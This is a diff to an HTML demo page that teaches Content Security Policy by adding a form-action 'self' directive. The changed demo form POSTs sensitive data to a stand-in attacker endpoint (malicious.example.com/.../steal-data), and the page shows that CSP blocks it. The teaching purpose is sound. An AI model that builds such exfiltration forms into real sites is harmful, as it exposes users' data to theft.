@@ -24,7 +24,7 @@
             <p>This page has basic Content Security Policy protection. Inline scripts are blocked, external scripts from untrusted domains are blocked.</p>
             
             <div class="code-example">
-Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src *; object-src 'none';
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; form-action 'self'; img-src *; object-src 'none';
             </div>
             
             <div class="demo-form">
@@ -38,17 +38,18 @@ Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
             </div>
             
             <div class="demo-form">
-                <h3>Cross-Origin Data Submission Test</h3>
-                <form id="crossOriginForm">
-                    <input type="text" id="sensitiveData" placeholder="Sensitive data" required>
+                <h3>Cross-Origin Form Submission Test</h3>
+                <form action="http://malicious.example.com:3000/malicious/steal-data" method="POST" target="_blank">
+                    <input type="hidden" name="source" value="basic-csp.example.com">
+                    <input type="text" name="sensitiveData" placeholder="Sensitive data" required>
                     <button type="submit" class="dangerous">Submit to Malicious Domain</button>
                 </form>
-                <div id="crossOriginResult"></div>
+                <p><em>🛡️ This form submission will be blocked by form-action 'self' directive!</em></p>
             </div>
             
             <div class="demo-form">
                 <h3>Script Execution Tests</h3>
-                <button onclick="testInlineScript()">Test Inline Script (WILL FAIL)</button>
+                <button id="inlineScriptBtn">Test Inline Script (WILL FAIL)</button>
                 <button id="externalScriptBtn">Test External Script (WILL FAIL)</button>
                 <button id="imageXSSBtn">Test Image XSS (WILL FAIL)</button>
             </div>
@@ -61,9 +62,14 @@ Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
                     <li>❌ Inline scripts are blocked (check browser console for CSP violations)</li>
                     <li>❌ External scripts from untrusted domains are blocked</li>
                     <li>❌ Event handlers in HTML are blocked</li>
+                    <li>❌ Form submissions to external domains are blocked</li>
                     <li>✅ Legitimate scripts from same origin work fine</li>
                     <li>🔍 Open browser console to see CSP violation reports</li>
                 </ul>
+                
+                <div class="code-view-button">
+                    <a href="/basic-csp/code" target="_blank" class="demo-button">📝 View JavaScript Code</a>
+                </div>
             </div>
         </div>
     </main>
